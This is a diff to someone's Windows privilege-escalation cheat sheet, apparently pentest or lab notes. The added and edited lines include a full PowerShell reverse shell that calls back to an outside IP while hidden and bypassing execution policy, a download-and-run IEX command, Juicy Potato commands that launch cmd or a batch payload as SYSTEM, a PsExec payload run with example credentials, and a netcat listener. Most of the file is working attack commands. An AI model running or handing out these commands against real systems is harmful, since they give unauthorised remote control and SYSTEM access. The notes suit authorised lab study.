@@ -262,6 +262,9 @@ Pattern
                   https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
 
            Starts with whoami/priv
+           
+           From cmd to powershell
+                  powershell -NoP -NonI -W Hidden -Exec Bypass -ep bypass "& {$ps=$false;$hostip='1.1.1.1';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 
         
         4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
@@ -294,7 +297,7 @@ Pattern
                       https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
                       PsExec64.exe -i -accepteula -d -s reverse_3333.exe
              
-        4.2.2 Passing cred
+        4.2.2 Passing another user's creds
             '/Psexec.exe /accepteula -user alice -p aliceishere -c ./8000.exe'                       
                     
         4.2.3 Saving Creds         
@@ -318,14 +321,18 @@ Pattern
                 check     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                 https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
                 https://eternallybored.org/misc/netcat/
+                               
+                
+                Verify that Juicy Potato works on the computer. 
+                Search for working CSLID and run a common program to test the CSLID. 
+                   jp86.exe -t t -p c:\windows\system32\cmd.exe -l 5839 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
+                   
                 1. Send Powershell 
                    Create a bat file
-                     powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1)"
+                     powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1')"
                    Create a reverse shell using nisheng and name it rev_4444.ps1
                    Execute the bat file using Juicy Potato
-                     Verify that Juicy Potato works on the computer. 
-                           jp86.exe -t t -p c:\windows\system32\cmd.exe -l 5839 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
-                     jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001
+                     jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
                      host: rlwrap -r nc -nlvp 4444
                 2. Netcat way
                    Place Juicy Potato and netcat on the target computer. 
